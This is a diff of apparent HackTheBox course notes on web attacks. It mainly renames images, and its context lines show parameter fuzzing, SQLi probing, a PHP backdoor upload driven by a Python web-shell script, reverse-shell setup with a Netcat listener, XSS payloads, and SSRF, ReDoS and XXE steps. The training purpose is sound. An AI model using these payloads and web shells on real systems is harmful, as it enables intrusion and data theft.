@@ -12,7 +12,7 @@ We notice a similar response size in every request. This is because supplying an
 
 Let us filter out any responses having a size of 19, as follows.
 
-&#x20; Information Disclosure (with a twist of SQLi)
+Information Disclosure (with a twist of SQLi)
 
 <pre class="language-shell-session"><code class="lang-shell-session">eldeim@htb[/htb]$ ffuf -w "/home/htb-acxxxxx/Desktop/Useful Repos/SecLists/Discovery/Web-Content/burp-parameter-names.txt" -u 'http://&#x3C;TARGET IP>:3003/?FUZZ=test_value' -fs 19
 
@@ -59,7 +59,7 @@ ________________________________________________
 
 It looks like _id_ is a valid parameter. Let us check the response when specifying _id_ as a parameter and a test value.
 
-&#x20; Information Disclosure (with a twist of SQLi)
+Information Disclosure (with a twist of SQLi)
 
 ```shell-session
 eldeim@htb[/htb]$ curl http://<TARGET IP>:3003/?id=1
@@ -106,7 +106,7 @@ Number found! 2
 
 * What is the username of the third user (id=3)?
 
-<figure><img src="../../../.gitbook/assets/image (19) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (677).png" alt=""><figcaption></figcaption></figure>
 
 ```
 ffuf -w "/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt" -u 'http://10.129.202.133:3003/?FUZZ=test_value' -fs 19
@@ -115,13 +115,11 @@ ________________________________________________
 id                      [Status: 200, Size: 38, Words: 7, Lines: 1, Duration: 24ms]
 ```
 
-<figure><img src="../../../.gitbook/assets/image (20) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
-
-
+<figure><img src="../../../.gitbook/assets/image (678).png" alt=""><figcaption></figcaption></figure>
 
 * Identify the username of the user that has a position of 736373 through SQLi. Submit it as your answer.<br>
 
-<figure><img src="../../../.gitbook/assets/image (21) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (679).png" alt=""><figcaption></figcaption></figure>
 
 ***
 
@@ -131,7 +129,7 @@ Suppose we are assessing an application residing in `http://<TARGET IP>:3001`.
 
 When we browse the application, an anonymous file uploading functionality sticks out.
 
-<figure><img src="../../../.gitbook/assets/image (23) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (680).png" alt=""><figcaption></figcaption></figure>
 
 Let us create the below file (save it as `backdoor.php`) and try to upload it via the available functionality.
 
@@ -141,7 +139,7 @@ Let us create the below file (save it as `backdoor.php`) and try to upload it vi
 
 > The above allows us to append the parameter _cmd_ to our request (to backdoor.php), which will be executed using _system()_. This is if we can determine _backdoor.php_'s location, if _backdoor.php_ will be rendered successfully and if no PHP function restrictions exist.
 
-<figure><img src="../../../.gitbook/assets/image (24) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (681).png" alt=""><figcaption></figcaption></figure>
 
 We can use the below Python script (save it as `web_shell.py`) to obtain a shell, leveraging the uploaded `backdoor.php` file.
 
@@ -171,7 +169,7 @@ if args.target and args.option == "yes": # if the target option is set and args.
 
 Use the script as follows.
 
-&#x20; Arbitrary File Upload
+Arbitrary File Upload
 
 ```shell-session
 eldeim@htb[/htb]$ python3 web_shell.py -t http://<TARGET IP>:3001/uploads/backdoor.php -o yes
@@ -181,7 +179,7 @@ uid=0(root) gid=0(root) groups=0(root)
 
 To obtain a more functional (reverse) shell, execute the below inside the shell gained through the Python script above. Ensure that an active listener (such as Netcat) is in place before executing the below.
 
-&#x20; Arbitrary File Upload
+Arbitrary File Upload
 
 ```shell-session
 eldeim@htb[/htb]$ python3 web_shell.py -t http://<TARGET IP>:3001/uploads/backdoor.php -o yes
@@ -261,7 +259,7 @@ The API is indeed vulnerable to Local File Inclusion!
 
 ## Cross-Site Scripting (XSS)
 
-<figure><img src="../../../.gitbook/assets/image (25) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (682).png" alt=""><figcaption></figcaption></figure>
 
 `test_value` is reflected in the response.
 
@@ -273,7 +271,7 @@ Code: javascript
 <script>alert(document.domain)</script>
 ```
 
-<figure><img src="../../../.gitbook/assets/image (26) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (683).png" alt=""><figcaption></figcaption></figure>
 
 It looks like the application is encoding the submitted payload. We can try URL-encoding our payload once and submitting it again, as follows.
 
@@ -281,7 +279,7 @@ It looks like the application is encoding the submitted payload. We can try URL-
 %3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
 ```
 
-<figure><img src="../../../.gitbook/assets/image (27) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (684).png" alt=""><figcaption></figcaption></figure>
 
 ***
 
@@ -291,7 +289,7 @@ Suppose we are assessing such an API residing in `http://<TARGET IP>:3000/api/us
 
 Let us first interact with it.
 
-&#x20; Server-Side Request Forgery (SSRF)
+Server-Side Request Forgery (SSRF)
 
 ```shell-session
 eldeim@htb[/htb]$ curl http://<TARGET IP>:3000/api/userinfo
@@ -344,7 +342,7 @@ The API resides in `http://<TARGET IP>:3000/api/check-email` and accepts a param
 
 Let's interact with it as follows.
 
-&#x20; Regular Expression Denial of Service (ReDoS)
+Regular Expression Denial of Service (ReDoS)
 
 ```shell-session
 eldeim@htb[/htb]$ curl "http://<TARGET IP>:3000/api/check-email?email=test_value"
@@ -353,13 +351,13 @@ eldeim@htb[/htb]$ curl "http://<TARGET IP>:3000/api/check-email?email=test_value
 
 Submit the above regex to [regex101.com](https://regex101.com/) for an in-depth explanation. Then, submit the above regex to [https://jex.im/regulex/](https://jex.im/regulex/#!flags=\&re=%5E\(%5Ba-zA-Z0-9_.-%5D\)%2B%40\(\(%5Ba-zA-Z0-9-%5D\)%2B.\)%2B\(%5Ba-zA-Z0-9%5D%7B2%2C4%7D\)%2B%24) for a visualization.
 
-<figure><img src="../../../.gitbook/assets/image (28) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (685).png" alt=""><figcaption></figcaption></figure>
 
 The second and third groups are doing bad iterative checks.
 
 Let's submit the following valid value and see how long the API takes to respond.
 
-&#x20; Regular Expression Denial of Service (ReDoS)
+Regular Expression Denial of Service (ReDoS)
 
 ```shell-session
 eldeim@htb[/htb]$ curl "http://<TARGET IP>:3000/api/check-email?email=jjjjjjjjjjjjjjjjjjjjjjjjjjjj@ccccccccccccccccccccccccccccc.55555555555555555555555555555555555555555555555555555555."
@@ -388,7 +386,7 @@ Activate burp suite's proxy (_Intercept On_) and configure your browser to go th
 
 Now let us try authenticating. We should see the below inside Burp Suite's proxy.
 
-<figure><img src="../../../.gitbook/assets/image (29) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (686).png" alt=""><figcaption></figcaption></figure>
 
 ```http
 POST /api/login/ HTTP/1.1
@@ -434,7 +432,7 @@ We have called our external entity _somename_, and it will use the SYSTEM keywor
 
 Let us set up a Netcat listener as follows.
 
-&#x20;eldeim@htb\[/htb]$ nc -nlvp 4444
+eldeim@htb\[/htb]$ nc -nlvp 4444
 
 ```shell-session
 listening on [any] 4444 ...
